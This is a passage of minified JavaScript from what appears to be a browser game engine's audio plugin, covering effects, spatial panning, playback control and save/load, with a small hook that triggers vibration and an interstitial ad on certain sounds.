                    this.params[0] = e, G(this.oscNode.frequency, e, i, n);
                    break
            }
        }, Q.prototype.setDrive = function (t, e) {
            t < .01 && (t = .01), this.preGain.gain.value = t, this.postGain.gain.value = Math.pow(1 / t, .6) * e
        }, Q.prototype.shape = function (t, e, i) {
            var n = 1.05 * i * e - e,
                r = t < 0 ? -1 : 1,
                s = t < 0 ? -t : t,
                o = s < e ? s : e + n * function (t, e) {
                    return 1 - Math.exp(-e * t)
                }(s - e, 1 / n);
            return o *= r
        }, Q.prototype.generateColortouchCurve = function (t, e) {
            for (var i = L(t), n = L(e), r = 32768, s = 0, o = 0; o < r; ++o) s = o / r, s = this.shape(s, i, n), this.curve[r + o] = s, this.curve[r - o - 1] = -s
        }, Q.prototype.connectTo = function (t) {
            this.wetNode.disconnect(), this.wetNode.connect(t), this.dryNode.disconnect(), this.dryNode.connect(t)
        }, Q.prototype.remove = function () {
            this.inputNode.disconnect(), this.preGain.disconnect(), this.waveShaper.disconnect(), this.postGain.disconnect(), this.wetNode.disconnect(), this.dryNode.disconnect()
        }, Q.prototype.getInputNode = function () {
            return this.inputNode
        }, Q.prototype.setParam = function (t, e, i, n) {
            switch (t) {
                case 0:
                    (e /= 100) < 0 && (e = 0), e > 1 && (e = 1), this.params[4] = e, G(this.wetNode.gain, e, i, n), G(this.dryNode.gain, 1 - e, i, n);
                    break
            }
        }, Z.prototype.connectTo = function (t) {
            this.node.disconnect(), this.node.connect(t)
        }, Z.prototype.remove = function () {
            this.node.disconnect()
        }, Z.prototype.getInputNode = function () {
            return this.node
        }, Z.prototype.setParam = function (t, e, i, n) {}, $.prototype.tick = function () {
            this.node.getFloatFrequencyData(this.freqBins), this.node.getByteTimeDomainData(this.signal);
            var t = this.node.fftSize,
                e = 0;
            this.peak = 0;
            for (var i = 0, n = 0; e < t; e++)(n = (this.signal[e] - 128) / 128) < 0 && (n = -n), this.peak < n && (this.peak = n), i += n * n;
            this.peak = R(this.peak), this.rms = R(Math.sqrt(i / t))
        }, $.prototype.connectTo = function (t) {
            this.node.disconnect(), this.node.connect(t)
        }, $.prototype.remove = function () {
            this.node.disconnect()
        }, $.prototype.getInputNode = function () {
            return this.node
        }, $.prototype.setParam = function (t, e, i, n) {}, tt.prototype.setObject = function (t) {
            this.obj = t
        }, tt.prototype.hasObject = function () {
            return !!this.obj
        }, tt.prototype.tick = function (t) {}, et.prototype.release = function () {
            var t, e, i, n;
            for (t = 0, i = 0, e = h.length; t < e; ++t) n = h[t], h[i] = n, n.buffer === this ? n.stop() : ++i;
            h.length = i, this.mediaSourceNode && (this.mediaSourceNode.disconnect(), this.mediaSourceNode = null), this.outNode && (this.outNode.disconnect(), this.outNode = null), this.bufferObject = null, this.audioData = null
        }, et.prototype.decodeAudioBuffer = function () {
            if (!this.bufferObject && this.audioData) {
                var t = this;
                if (o.decodeAudioData) o.decodeAudioData(this.audioData, (function (i) {
                    var n, r, s, o;
                    if (t.bufferObject = i, t.audioData = null, cr.is_undefined(t.playTagWhenReady) || p) {
                        if (!cr.is_undefined(t.convolveWhenReady)) {
                            var a = t.convolveWhenReady.convolveNode;
                            a.normalize = t.normalizeWhenReady, a.buffer = i
                        }
                    } else if (t.panWhenReady.length) {
                        for (r = 0, s = t.panWhenReady.length; r < s; r++)
                            if (n = t.panWhenReady[r], (o = new it(t, n.thistag)).setPannerEnabled(!0), void 0 === n.objUid || (n.obj = e.getObjectByUID(n.objUid), n.obj)) {
                                if (n.obj) {
                                    var c = cr.rotatePtAround(n.obj.x, n.obj.y, -n.obj.layer.getAngle(), f, m, !0),
                                        l = cr.rotatePtAround(n.obj.x, n.obj.y, -n.obj.layer.getAngle(), f, m, !1);
                                    o.setPan(c, l, cr.to_degrees(n.obj.angle - n.obj.layer.getAngle()), n.ia, n.oa, n.og), o.setObject(n.obj)
                                } else o.setPan(n.x, n.y, n.a, n.ia, n.oa, n.og);
                                o.play(t.loopWhenReady, t.volumeWhenReady, t.seekWhenReady), t.pauseWhenReady && o.pause(), h.push(o)
                            } cr.clearArray(t.panWhenReady)
                    } else(o = new it(t, t.playTagWhenReady || "")).play(t.loopWhenReady, t.volumeWhenReady, t.seekWhenReady), t.pauseWhenReady && o.pause(), h.push(o)
                }), (function (e) {
                    t.failedToLoad = !0
                }));
                else if (this.bufferObject = o.createBuffer(this.audioData, !1), this.audioData = null, cr.is_undefined(this.playTagWhenReady) || p) {
                    if (!cr.is_undefined(this.convolveWhenReady)) {
                        var i = this.convolveWhenReady.convolveNode;
                        i.normalize = this.normalizeWhenReady, i.buffer = this.bufferObject
                    }
                } else {
                    var n = new it(this, this.playTagWhenReady);
                    n.play(this.loopWhenReady, this.volumeWhenReady, this.seekWhenReady), this.pauseWhenReady && n.pause(), h.push(n)
                }
            }
        }, et.prototype.isLoaded = function () {
            switch (this.myapi) {
                case 0:
                    var t = this.bufferObject.readyState >= 4;
                    return t && (this.wasEverReady = !0), t || this.wasEverReady;
                case 1:
                    return !!this.audioData || !!this.bufferObject;
                case 2:
                    return !0;
                case 3:
                    return !0
            }
            return !1
        }, et.prototype.isLoadedAndDecoded = function () {
            switch (this.myapi) {
                case 0:
                    return this.isLoaded();
                case 1:
                    return !!this.bufferObject;
                case 2:
                    return !0;
                case 3:
                    return !0
            }
            return !1
        }, et.prototype.hasFailedToLoad = function () {
            switch (this.myapi) {
                case 0:
                    return !!this.bufferObject.error;
                case 1:
                    return this.failedToLoad
            }
            return !1
        }, it.prototype.hasEnded = function () {
            switch (this.myapi) {
                case 0:
                    return this.instanceObject.ended;
                case 1:
                    return 1 === this.buffer.myapi ? !(!this.fresh && !this.stopped && this.instanceObject.loop) && (!this.is_paused && this.hasPlaybackEnded) : this.instanceObject.ended;
                case 2:
                    return this.hasPlaybackEnded;
                case 3:
            }
            return !0
        }, it.prototype.canBeRecycled = function () {
            return !(!this.fresh && !this.stopped) || this.hasEnded()
        }, it.prototype.setPannerEnabled = function (t) {
            if (1 === s)
                if (!this.pannerEnabled && t) {
                    if (!this.gainNode) return;
                    this.pannerNode || (this.pannerNode = o.createPanner(), "number" == typeof this.pannerNode.panningModel ? this.pannerNode.panningModel = y : this.pannerNode.panningModel = ["equalpower", "HRTF", "soundfield"][y], "number" == typeof this.pannerNode.distanceModel ? this.pannerNode.distanceModel = _ : this.pannerNode.distanceModel = ["linear", "inverse", "exponential"][_], this.pannerNode.refDistance = v, this.pannerNode.maxDistance = b, this.pannerNode.rolloffFactor = w), this.gainNode.disconnect(), this.gainNode.connect(this.pannerNode), this.pannerNode.connect(B(this.tag)), this.pannerEnabled = !0
                } else if (this.pannerEnabled && !t) {
                if (!this.gainNode) return;
                this.pannerNode.disconnect(), this.gainNode.disconnect(), this.gainNode.connect(B(this.tag)), this.pannerEnabled = !1
            }
        }, it.prototype.setPan = function (t, e, i, n, r, o) {
            this.pannerEnabled && 1 === s && (this.pannerNode.setPosition(t, e, 0), this.pannerNode.setOrientation(Math.cos(cr.to_radians(i)), Math.sin(cr.to_radians(i)), 0), this.pannerNode.coneInnerAngle = n, this.pannerNode.coneOuterAngle = r, this.pannerNode.coneOuterGain = o, this.panX = t, this.panY = e, this.panAngle = i, this.panConeInner = n, this.panConeOuter = r, this.panConeOuterGain = o)
        }, it.prototype.setObject = function (t) {
            this.pannerEnabled && 1 === s && (this.objectTracker || (this.objectTracker = new tt), this.objectTracker.setObject(t))
        }, it.prototype.tick = function (t) {
            if (this.pannerEnabled && 1 === s && this.objectTracker && this.objectTracker.hasObject() && this.isPlaying()) {
                this.objectTracker.tick(t);
                var e = this.objectTracker.obj,
                    i = cr.rotatePtAround(e.x, e.y, -e.layer.getAngle(), f, m, !0),
                    n = cr.rotatePtAround(e.x, e.y, -e.layer.getAngle(), f, m, !1);
                this.pannerNode.setPosition(i, n, 0);
                var r = 0;
                void 0 !== this.objectTracker.obj.angle && (r = e.angle - e.layer.getAngle(), this.pannerNode.setOrientation(Math.cos(r), Math.sin(r), 0))
            }
        }, it.prototype.play = function (t, i, n, r) {
            var s = this.instanceObject;
            this.looping = t, this.volume = i;
            var a = n || 0;
			
			if (this.src.indexOf('media/car hit.ogg') >= 0 || this.src.indexOf('media/gold.ogg') >= 0 )
			{
				console.log(this.src);
                adManager.vibrateshort();
			}
			if (this.src.indexOf("lose.ogg") >= 0)
            {
                 adManager.showInterstitial();
            }
            switch (r = r || 0, this.myapi) {
                case 0:
                    if (1 !== s.playbackRate && (s.playbackRate = 1), s.volume !== i * d && (s.volume = i * d), s.loop !== t && (s.loop = t), s.muted && (s.muted = !1), s.currentTime !== a) try {
                        s.currentTime = a
                    } catch (t) {}
                    P(this);
                    break;
                case 1:
                    if (this.muted = !1, this.mutevol = 1, 1 === this.buffer.myapi) this.gainNode.gain.value = i * d, this.fresh || (this.instanceObject = o.createBufferSource(), this.instanceObject.buffer = this.buffer.bufferObject, this.instanceObject.connect(this.gainNode)), this.instanceObject.onended = this.onended_handler, this.active_buffer = this.instanceObject, this.instanceObject.loop = t, this.hasPlaybackEnded = !1, 0 === a ? D(this.instanceObject, r) : j(this.instanceObject, a, this.getDuration(), r);
                    else {
                        if (1 !== s.playbackRate && (s.playbackRate = 1), s.loop !== t && (s.loop = t), s.volume = i * d, s.currentTime !== a) try {
                            s.currentTime = a
                        } catch (t) {}
                        P(this)
                    }
                    break;
                case 2:
                    (!this.fresh && this.stopped || 0 !== a) && s.seekTo(a), s.play(), this.hasPlaybackEnded = !1;
                    break;
                case 3:
                    e.isDirectCanvas ? AppMobi.context.playSound(this.src, t) : AppMobi.player.playSound(this.src, t);
                    break
            }
            this.playbackRate = 1, this.startTime = (this.isTimescaled ? e.kahanTime.sum : e.wallTime.sum) - a, this.fresh = !1, this.stopped = !1, this.is_paused = !1
        }, it.prototype.stop = function () {
            switch (this.myapi) {
                case 0:
                    this.instanceObject.paused || this.instanceObject.pause();
                    break;
                case 1:
                    1 === this.buffer.myapi ? z(this.instanceObject) : this.instanceObject.paused || this.instanceObject.pause();
                    break;
                case 2:
                    this.instanceObject.stop();
                    break;
                case 3:
                    e.isDirectCanvas && AppMobi.context.stopSound(this.src);
                    break
            }
            this.stopped = !0, this.is_paused = !1
        }, it.prototype.pause = function () {
            if (!(this.fresh || this.stopped || this.hasEnded() || this.is_paused)) {
                switch (this.myapi) {
                    case 0:
                        this.instanceObject.paused || this.instanceObject.pause();
                        break;
                    case 1:
                        1 === this.buffer.myapi ? (this.resume_position = this.getPlaybackTime(!0), this.looping && (this.resume_position = this.resume_position % this.getDuration()), this.is_paused = !0, z(this.instanceObject)) : this.instanceObject.paused || this.instanceObject.pause();
                        break;
                    case 2:
                        this.instanceObject.pause();
                        break;
                    case 3:
                        e.isDirectCanvas && AppMobi.context.stopSound(this.src);
                        break
                }
                this.is_paused = !0
            }
        }, it.prototype.resume = function () {
            if (!(this.fresh || this.stopped || this.hasEnded()) && this.is_paused) {
                switch (this.myapi) {
                    case 0:
                        P(this);
                        break;
                    case 1:
                        1 === this.buffer.myapi ? (this.instanceObject = o.createBufferSource(), this.instanceObject.buffer = this.buffer.bufferObject, this.instanceObject.connect(this.gainNode), this.instanceObject.onended = this.onended_handler, this.active_buffer = this.instanceObject, this.instanceObject.loop = this.looping, this.gainNode.gain.value = d * this.volume * this.mutevol, this.updatePlaybackRate(), this.startTime = (this.isTimescaled ? e.kahanTime.sum : e.wallTime.sum) - this.resume_position / (this.playbackRate || .001), j(this.instanceObject, this.resume_position, this.getDuration())) : P(this);
                        break;
                    case 2:
                        this.instanceObject.play();
                        break;
                    case 3:
                        e.isDirectCanvas && AppMobi.context.resumeSound(this.src);
                        break
                }
                this.is_paused = !1
            }
        }, it.prototype.seek = function (t) {
            if (!(this.fresh || this.stopped || this.hasEnded())) switch (this.myapi) {
                case 0:
                    try {
                        this.instanceObject.currentTime = t
                    } catch (t) {}
                    break;
                case 1:
                    if (1 === this.buffer.myapi) this.is_paused ? this.resume_position = t : (this.pause(), this.resume_position = t, this.resume());
                    else try {
                        this.instanceObject.currentTime = t
                    } catch (t) {}
                    break;
                case 2:
                    break;
                case 3:
                    e.isDirectCanvas && AppMobi.context.seekSound(this.src, t);
                    break
            }
        }, it.prototype.reconnect = function (t) {
            1 === this.myapi && (this.pannerEnabled ? (this.pannerNode.disconnect(), this.pannerNode.connect(t)) : (this.gainNode.disconnect(), this.gainNode.connect(t)))
        }, it.prototype.getDuration = function (t) {
            var i = 0;
            switch (this.myapi) {
                case 0:
                    void 0 !== this.instanceObject.duration && (i = this.instanceObject.duration);
                    break;
                case 1:
                    i = this.buffer.bufferObject.duration;
                    break;
                case 2:
                    i = this.instanceObject.getDuration();
                    break;
                case 3:
                    e.isDirectCanvas && (i = AppMobi.context.getDurationSound(this.src));
                    break
            }
            return t && (i /= this.playbackRate || .001), i
        }, it.prototype.getPlaybackTime = function (t) {
            var i = this.getDuration(),
                n = 0;
            switch (this.myapi) {
                case 0:
                    void 0 !== this.instanceObject.currentTime && (n = this.instanceObject.currentTime);
                    break;
                case 1:
                    if (1 === this.buffer.myapi) {
                        if (this.is_paused) return this.resume_position;
                        n = (this.isTimescaled ? e.kahanTime.sum : e.wallTime.sum) - this.startTime
                    } else void 0 !== this.instanceObject.currentTime && (n = this.instanceObject.currentTime);
                    break;
                case 2:
                    break;
                case 3:
                    e.isDirectCanvas && (n = AppMobi.context.getPlaybackTimeSound(this.src));
                    break
            }
            return t && (n *= this.playbackRate), !this.looping && n > i && (n = i), n
        }, it.prototype.isPlaying = function () {
            return !(this.is_paused || this.fresh || this.stopped || this.hasEnded())
        }, it.prototype.shouldSave = function () {
            return !this.fresh && !this.stopped && !this.hasEnded()
        }, it.prototype.setVolume = function (t) {
            this.volume = t, this.updateVolume()
        }, it.prototype.updateVolume = function () {
            var t = this.volume * d;
            switch (isFinite(t) || (t = 0), this.myapi) {
                case 0:
                    void 0 !== this.instanceObject.volume && this.instanceObject.volume !== t && (this.instanceObject.volume = t);
                    break;
                case 1:
                    1 === this.buffer.myapi ? this.gainNode.gain.value = t * this.mutevol : void 0 !== this.instanceObject.volume && this.instanceObject.volume !== t && (this.instanceObject.volume = t);
                    break;
                case 2:
                    break;
                case 3:
                    break
            }
        }, it.prototype.getVolume = function () {
            return this.volume
        }, it.prototype.doSetMuted = function (t) {
            switch (this.myapi) {
                case 0:
                    this.instanceObject.muted !== !!t && (this.instanceObject.muted = !!t);
                    break;
                case 1:
                    1 === this.buffer.myapi ? (this.mutevol = t ? 0 : 1, this.gainNode.gain.value = d * this.volume * this.mutevol) : this.instanceObject.muted !== !!t && (this.instanceObject.muted = !!t);
                    break;
                case 2:
                    break;
                case 3:
                    break
            }
        }, it.prototype.setMuted = function (t) {
            this.is_muted = !!t, this.doSetMuted(this.is_muted || this.is_silent)
        }, it.prototype.setSilent = function (t) {
            this.is_silent = !!t, this.doSetMuted(this.is_muted || this.is_silent)
        }, it.prototype.setLooping = function (t) {
            switch (this.looping = t, this.myapi) {
                case 0:
                    this.instanceObject.loop !== !!t && (this.instanceObject.loop = !!t);
                    break;
                case 1:
                    this.instanceObject.loop !== !!t && (this.instanceObject.loop = !!t);
                    break;
                case 2:
                    break;
                case 3:
                    e.isDirectCanvas && AppMobi.context.setLoopingSound(this.src, t);
                    break
            }
        }, it.prototype.setPlaybackRate = function (t) {
            this.playbackRate = t, this.updatePlaybackRate()
        }, it.prototype.updatePlaybackRate = function () {
            var t = this.playbackRate;
            switch (this.isTimescaled && (t *= e.timescale), this.myapi) {
                case 0:
                    this.instanceObject.playbackRate !== t && (this.instanceObject.playbackRate = t);
                    break;
                case 1:
                    1 === this.buffer.myapi ? this.instanceObject.playbackRate.value !== t && (this.instanceObject.playbackRate.value = t) : this.instanceObject.playbackRate !== t && (this.instanceObject.playbackRate = t);
                    break;
                case 2:
                    break;
                case 3:
                    break
            }
        }, it.prototype.setSuspended = function (t) {
            switch (this.myapi) {
                case 0:
                    t ? this.isPlaying() ? (this.resume_me = !0, this.instanceObject.pause()) : this.resume_me = !1 : this.resume_me && (this.instanceObject.play(), this.resume_me = !1);
                    break;
                case 1:
                    t ? this.isPlaying() ? (this.resume_me = !0, 1 === this.buffer.myapi ? (this.resume_position = this.getPlaybackTime(!0), this.looping && (this.resume_position = this.resume_position % this.getDuration()), z(this.instanceObject)) : this.instanceObject.pause()) : this.resume_me = !1 : this.resume_me && (1 === this.buffer.myapi ? (this.instanceObject = o.createBufferSource(), this.instanceObject.buffer = this.buffer.bufferObject, this.instanceObject.connect(this.gainNode), this.instanceObject.onended = this.onended_handler, this.active_buffer = this.instanceObject, this.instanceObject.loop = this.looping, this.gainNode.gain.value = d * this.volume * this.mutevol, this.updatePlaybackRate(), this.startTime = (this.isTimescaled ? e.kahanTime.sum : e.wallTime.sum) - this.resume_position / (this.playbackRate || .001), j(this.instanceObject, this.resume_position, this.getDuration())) : this.instanceObject.play(), this.resume_me = !1);
                    break;
                case 2:
                    t ? this.isPlaying() ? (this.instanceObject.pause(), this.resume_me = !0) : this.resume_me = !1 : this.resume_me && (this.resume_me = !1, this.instanceObject.play());
                    break;
                case 3:
                    break
            }
        }, t.Instance = function (t) {
            if (this.type = t, this.runtime = t.runtime, e = this.runtime, i = this, this.listenerTracker = null, this.listenerZ = -600, this.runtime.isWKWebView && (A = !0), !(this.runtime.isiOS || this.runtime.isAndroid && (this.runtime.isChrome || this.runtime.isAndroidStockBrowser)) || this.runtime.isCrosswalk || this.runtime.isDomFree || this.runtime.isAmazonWebApp || A || (T = !0), o = null, "undefined" != typeof AudioContext ? (s = 1, o = new AudioContext) : "undefined" != typeof webkitAudioContext && (s = 1, o = new webkitAudioContext), this.runtime.isiOS && o && (o.close && o.close(), "undefined" != typeof AudioContext ? o = new AudioContext : "undefined" != typeof webkitAudioContext && (o = new webkitAudioContext)), 1 !== s && (this.runtime.isCordova && void 0 !== window.Media ? s = 2 : this.runtime.isAppMobi && (s = 3)), 2 === s) {
                var n = (r = location.href).lastIndexOf("/");
                n > -1 && (r = r.substr(0, n + 1)), r = r.replace("file://", "")
            }
            if (this.runtime.isSafari && this.runtime.isWindows && "undefined" == typeof Audio) alert("It looks like you're using Safari for Windows without Quicktime.  Audio cannot be played until Quicktime is installed."), this.runtime.DestroyInstance(this);
            else {
                if (this.runtime.isDirectCanvas) l = this.runtime.isAndroid;
                else try {
                    l = !!(new Audio).canPlayType('audio/ogg; codecs="vorbis"')
                } catch (t) {
                    l = !1
                }
                switch (s) {
                    case 0:
                        break;
                    case 1:
                        break;
                    case 2:
                        break;
                    case 3:
                        break;
                    default:
                }
                this.runtime.tickMe(this)
            }
        };
        var nt = t.Instance.prototype;
        nt.onCreate = function () {
            this.runtime.audioInstance = this, u = this.properties[0], this.saveload = this.properties[1], this.playinbackground = 0 !== this.properties[2], this.nextPlayTime = 0, y = this.properties[3], _ = this.properties[4], this.listenerZ = -this.properties[5], v = this.properties[6], b = this.properties[7], w = this.properties[8], this.listenerTracker = new tt;
            var t = this.runtime.draw_width || this.runtime.width,
                e = this.runtime.draw_height || this.runtime.height;
            1 === s && (o.listener.setPosition(t / 2, e / 2, this.listenerZ), o.listener.setOrientation(0, 0, 1, 0, -1, 0), window.c2OnAudioMicStream = function (t, e) {
                x && x.disconnect(), S = e.toLowerCase(), (x = o.createMediaStreamSource(t)).connect(B(S))
            }), this.runtime.addSuspendCallback((function (t) {
                i.onSuspend(t)
            }));
            var n = this;
            this.runtime.addDestroyCallback((function (t) {
                n.onInstanceDestroyed(t)
            }))
        }, nt.onInstanceDestroyed = function (t) {
            var e, i, n;
            for (e = 0, i = h.length; e < i; e++)(n = h[e]).objectTracker && n.objectTracker.obj === t && (n.objectTracker.obj = null, n.pannerEnabled && n.isPlaying() && n.looping && n.stop());
            this.listenerTracker.obj === t && (this.listenerTracker.obj = null)
        }, nt.saveToJSON = function () {
            var t, e, i, n, r, s, o, a = {
                    silent: p,
                    masterVolume: d,
                    listenerZ: this.listenerZ,
                    listenerUid: this.listenerTracker.hasObject() ? this.listenerTracker.obj.uid : -1,
                    playing: [],
                    effects: {}
                },
                c = a.playing;
            for (t = 0, e = h.length; t < e; t++)(i = h[t]).shouldSave() && 3 !== this.saveload && (i.is_music && 1 === this.saveload || (i.is_music || 2 !== this.saveload) && (o = i.getPlaybackTime(), i.looping && (o %= i.getDuration()), n = {
                tag: i.tag,
                buffersrc: i.buffer.src,
                is_music: i.is_music,
                playbackTime: o,
                volume: i.volume,
                looping: i.looping,
                muted: i.is_muted,
                playbackRate: i.playbackRate,
                paused: i.is_paused,
                resume_position: i.resume_position
            }, i.pannerEnabled && (n.pan = {}, s = n.pan, i.objectTracker && i.objectTracker.hasObject() ? s.objUid = i.objectTracker.obj.uid : (s.x = i.panX, s.y = i.panY, s.a = i.panAngle), s.ia = i.panConeInner, s.oa = i.panConeOuter, s.og = i.panConeOuterGain), c.push(n)));
            var l, u = a.effects;
            for (r in M)
                if (M.hasOwnProperty(r)) {
                    for (l = [], t = 0, e = M[r].length; t < e; t++) l.push({
                        type: M[r][t].type,
                        params: M[r][t].params
                    });
                    u[r] = l
                } return a
        };
        var rt = [];
        nt.loadFromJSON = function (t) {
            var e = t.silent;
            d = t.masterVolume, this.listenerZ = t.listenerZ, this.listenerTracker.setObject(null);
            var i = t.listenerUid; - 1 !== i && (this.listenerTracker.loadUid = i, rt.push(this.listenerTracker));
            var n, r, s, o, a, c, l, u, f, m, g, y, _, v, b, w, x, S, T = t.playing;
            if (3 !== this.saveload)
                for (n = 0, r = h.length; n < r; n++)(g = h[n]).is_music && 1 === this.saveload || (g.is_music || 2 !== this.saveload) && g.stop();
            for (y in M)
                if (M.hasOwnProperty(y))
                    for (n = 0, r = M[y].length; n < r; n++) M[y][n].remove();
            for (y in cr.wipe(M), t.effects)
                if (t.effects.hasOwnProperty(y))
                    for (n = 0, r = (b = t.effects[y]).length; n < r; n++) switch (w = b[n].type, x = b[n].params, w) {
                        case "filter":
                            lt(y, new U(x[0], x[1], x[2], x[3], x[4], x[5]));
                            break;
                        case "delay":
                            lt(y, new V(x[0], x[1], x[2]));
                            break;
                        case "convolve":
                            o = x[2], (m = this.getAudioBuffer(o, !1)).bufferObject ? S = new X(m.bufferObject, x[0], x[1], o) : (S = new X(null, x[0], x[1], o), m.normalizeWhenReady = x[0], m.convolveWhenReady = S), lt(y, S);
                            break;
                        case "flanger":
                            lt(y, new q(x[0], x[1], x[2], x[3], x[4]));
                            break;
                        case "phaser":
                            lt(y, new Y(x[0], x[1], x[2], x[3], x[4], x[5]));
                            break;
                        case "gain":
                            lt(y, new H(x[0]));
                            break;
                        case "tremolo":
                            lt(y, new J(x[0], x[1]));
                            break;
                        case "ringmod":
                            lt(y, new K(x[0], x[1]));
                            break;
                        case "distortion":
                            lt(y, new Q(x[0], x[1], x[2], x[3], x[4]));
                            break;
                        case "compressor":
                            lt(y, new Z(x[0], x[1], x[2], x[3], x[4]));
                            break;
                        case "analyser":
                            lt(y, new $(x[0], x[1]));
                            break
                    }
            for (n = 0, r = T.length; n < r; n++) 3 !== this.saveload && (o = (s = T[n]).buffersrc, a = s.is_music, c = s.tag, l = s.playbackTime, u = s.looping, f = s.volume, v = (_ = s.pan) && _.hasOwnProperty("objUid") ? _.objUid : -1, a && 1 === this.saveload || (a || 2 !== this.saveload) && ((g = this.getAudioInstance(o, c, a, u, f)) ? (g.resume_position = s.resume_position, g.setPannerEnabled(!!_), g.play(u, f, l), g.updatePlaybackRate(), g.updateVolume(), g.doSetMuted(g.is_muted || g.is_silent), s.paused && g.pause(), s.muted && g.setMuted(!0), g.doSetMuted(g.is_muted || g.is_silent), _ && (-1 !== v ? (g.objectTracker = g.objectTracker || new tt, g.objectTracker.loadUid = v, rt.push(g.objectTracker)) : g.setPan(_.x, _.y, _.a, _.ia, _.oa, _.og))) : ((m = this.getAudioBuffer(o, a)).seekWhenReady = l, m.pauseWhenReady = s.paused, _ && (-1 !== v ? m.panWhenReady.push({
                objUid: v,
                ia: _.ia,
                oa: _.oa,
                og: _.og,
                thistag: c
            }) : m.panWhenReady.push({
                x: _.x,
                y: _.y,
                a: _.a,
                ia: _.ia,
                oa: _.oa,
                og: _.og,
                thistag: c
            })))));
            if (e && !p) {
                for (n = 0, r = h.length; n < r; n++) h[n].setSilent(!0);
                p = !0
            } else if (!e && p) {
                for (n = 0, r = h.length; n < r; n++) h[n].setSilent(!1);
                p = !1
            }
        }, nt.afterLoad = function () {
            var t, e, i, n;
            for (t = 0, e = rt.length; t < e; t++) i = rt[t], n = this.runtime.getObjectByUID(i.loadUid), i.setObject(n), i.loadUid = -1, n && (f = n.x, m = n.y);
            cr.clearArray(rt)
        }, nt.onSuspend = function (t) {
            if (!this.playinbackground) {
                var e, i;
                for (!t && o && o.resume && (o.resume(), g = !1), e = 0, i = h.length; e < i; e++) h[e].setSuspended(t);
                t && o && o.suspend && (o.suspend(), g = !0)
            }
        }, nt.tick = function () {
            var t, e, i, n, r, a, c = this.runtime.dt;
            for (t = 0, e = h.length; t < e; t++)(i = h[t]).tick(c), 0 !== u && i.updatePlaybackRate();
            for (n in M)
                if (M.hasOwnProperty(n))
                    for (t = 0, e = (r = M[n]).length; t < e; t++)(a = r[t]).tick && a.tick();
            1 === s && this.listenerTracker.hasObject() && (this.listenerTracker.tick(c), f = this.listenerTracker.obj.x, m = this.listenerTracker.obj.y, o.listener.setPosition(this.listenerTracker.obj.x, this.listenerTracker.obj.y, this.listenerZ))
        };
        var st = [];
        nt.setPreloadList = function (t) {
            var e, i, n, r, s, o, a = 0;
            for (e = 0, i = t.length; e < i; ++e) r = (n = t[e])[0], s = 2 * n[1], ((o = r.length > 4 && ".ogg" === r.substr(r.length - 4)) && l || !o && !l) && (st.push({
                filename: r,
                size: s,
                obj: null
            }), a += s);
            return a
        }, nt.startPreloads = function () {
            var t, e, i, n;
            for (t = 0, e = st.length; t < e; ++t) i = st[t], n = this.runtime.files_subfolder + i.filename, i.obj = this.getAudioBuffer(n, !1)
        }, nt.getPreloadedSize = function () {
            var t, e, i, n = 0;
            for (t = 0, e = st.length; t < e; ++t)(i = st[t]).obj.isLoadedAndDecoded() || i.obj.hasFailedToLoad() || this.runtime.isDomFree || this.runtime.isAndroidStockBrowser ? n += i.size : i.obj.isLoaded() && (n += Math.floor(i.size / 2));
            return n
        }, nt.releaseAllMusicBuffers = function () {
            var t, e, i, n;
            for (t = 0, i = 0, e = a.length; t < e; ++t) n = a[t], a[i] = n, n.is_music ? n.release() : ++i;
            a.length = i
        }, nt.getAudioBuffer = function (t, e, i) {
            var n, r, s, o = null;
            for (n = 0, r = a.length; n < r; n++)
                if ((s = a[n]).src === t) {
                    o = s;
                    break
                } return o || i || (A && e && this.releaseAllMusicBuffers(), o = new et(t, e), a.push(o)), o
        }, nt.getAudioInstance = function (t, e, i, n, r) {
            var s, o, a;
            for (s = 0, o = h.length; s < o; s++)
                if ((a = h[s]).src === t && (a.canBeRecycled() || i)) return a.tag = e, a;
            var c = this.getAudioBuffer(t, i);
            return c.bufferObject ? (a = new it(c, e), h.push(a), a) : ("<preload>" !== e && (c.playTagWhenReady = e, c.loopWhenReady = n, c.volumeWhenReady = r), null)
        };
        var ot = [];

        function at(t, e) {
            var i = t.isPlaying() ? 1 : 0,
                n = e.isPlaying() ? 1 : 0;
            return i === n ? 0 : i < n ? 1 : -1
        }

        function ht(t, e) {
            if (cr.clearArray(ot), !t.length) return !c || c.hasEnded() ? void 0 : (cr.clearArray(ot), void(ot[0] = c));
            var i, n, r;
            for (i = 0, n = h.length; i < n; i++) r = h[i], cr.equals_nocase(t, r.tag) && ot.push(r);
            e && ot.sort(at)
        }

        function ct(t) {
            var e, i, n, r, s = o.destination;
            if (M.hasOwnProperty(t) && (n = M[t]).length)
                for (s = n[0].getInputNode(), e = 0, i = n.length; e < i; e++) r = n[e], e + 1 === i ? r.connectTo(o.destination) : r.connectTo(n[e + 1].getInputNode());
            for (ht(t), e = 0, i = ot.length; e < i; e++) ot[e].reconnect(s);
            x && S === t && (x.disconnect(), x.connect(s))
        }

        function lt(t, e) {
            M.hasOwnProperty(t) ? M[t].push(e) : M[t] = [e], ct(t)
        }

        function ut() {}

        function pt() {}

        function dt() {}

        function ft(t, e) {
            var i = null;
            return M.hasOwnProperty(t) && (i = M[t]), i && e >= 0 && e < i.length && i[e].freqBins ? i[e] : null
        }
        ut.prototype.OnEnded = function (t) {
            return cr.equals_nocase(n, t)
        }, ut.prototype.PreloadsComplete = function () {
            var t, e;
            for (t = 0, e = a.length; t < e; t++)
                if (!a[t].isLoadedAndDecoded() && !a[t].hasFailedToLoad()) return !1;
            return !0
        }, ut.prototype.AdvancedAudioSupported = function () {
            return 1 === s
        }, ut.prototype.IsSilent = function () {
            return p
        }, ut.prototype.IsAnyPlaying = function () {
            var t, e;
            for (t = 0, e = h.length; t < e; t++)
                if (h[t].isPlaying()) return !0;
            return !1
        }, ut.prototype.IsTagPlaying = function (t) {
            var e, i;
            for (ht(t), e = 0, i = ot.length; e < i; e++)
                if (ot[e].isPlaying()) return !0;
            return !1
        }, t.cnds = new ut, pt.prototype.Play = function (t, e, i, n) {
            if (!p) {
                var r = E(i),
                    s = t[1],
                    o = this.runtime.files_subfolder + t[0] + (l ? ".ogg" : ".m4a");
                (c = this.getAudioInstance(o, n, s, 0 !== e, r)) && (c.setPannerEnabled(!1), c.play(0 !== e, r, 0, this.nextPlayTime), this.nextPlayTime = 0)
            }
        }, pt.prototype.PlayAtPosition = function (t, e, i, n, r, s, o, a, h, u) {
            if (!p) {
                var d = E(i),
                    f = t[1],
                    m = this.runtime.files_subfolder + t[0] + (l ? ".ogg" : ".m4a");
